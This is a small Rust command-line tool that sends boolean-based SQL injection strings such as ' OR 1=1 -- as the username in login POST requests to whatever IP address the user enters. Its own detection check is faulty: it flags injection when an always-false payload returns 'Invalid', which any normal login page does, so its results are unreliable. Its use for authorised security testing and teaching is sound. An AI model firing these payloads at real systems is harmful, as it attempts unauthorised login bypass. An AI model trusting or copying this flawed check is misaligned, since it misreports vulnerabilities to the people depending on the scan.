use reqwest::Client;
use std::error::Error;

// Function to detect Boolean-Based SQL Injection by analyzing the response
async fn detect_boolean_sql_injection(ip_address: &str) -> Result<(), Box<dyn Error>> {
    println!("Checking for potential Boolean-Based SQL Injection on {}...", ip_address);

    // SQL injection payloads for Boolean-based SQL Injection
    let payloads = [
        "' OR 1=1 --",   // Always true condition
        "' OR 1=2 --",   // Always false condition
        "' AND 1=1 --",  // Always true condition with AND
        "' AND 1=2 --",  // Always false condition with AND
        "' OR 'a'='a' --",// Always true condition (alternative format)
        "' OR 'a'='b' --",// Always false condition (alternative format)
    ];

    // Target URL for testing (e.g., a login page or search endpoint)
    let url = format!("http://{}/login", ip_address);  // Adjust the URL accordingly

    // Create an HTTP client
    let client = Client::new();

    for payload in &payloads {
        let data = [
            ("username", payload),
            ("password", "password"),
        ];

        // Send the POST request
        let response = client.post(&url)
            .form(&data)
            .send()
            .await?;

        let response_text = response.text().await?;

        // Check for successful injection based on response content
        if response_text.contains("Welcome") && *payload == "' OR 1=1 --" {
            println!("[!] Boolean-Based SQL Injection detected with payload: {}", payload);
            println!("Response contains 'Welcome' message (indicating login success).");
        } else if response_text.contains("Invalid") && *payload == "' OR 1=2 --" {
            println!("[!] Boolean-Based SQL Injection detected with payload: {}", payload);
            println!("Response contains 'Invalid' message (indicating login failure).");
        } else {
            println!("[+] No Boolean-based SQL Injection detected with payload: {}", payload);
        }
    }

    Ok(())
}

// Main function to prompt the user and start the detection process
#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    
    // Prompt the user for an IP address to test for Boolean SQL Injection
    let mut ip_address = String::new();
    println!("Enter the target IP address:");
    std::io::stdin().read_line(&mut ip_address)?;
    let ip_address = ip_address.trim();

    // Start detecting Boolean-Based SQL Injection
    detect_boolean_sql_injection(ip_address).await?;

    Ok(())
}
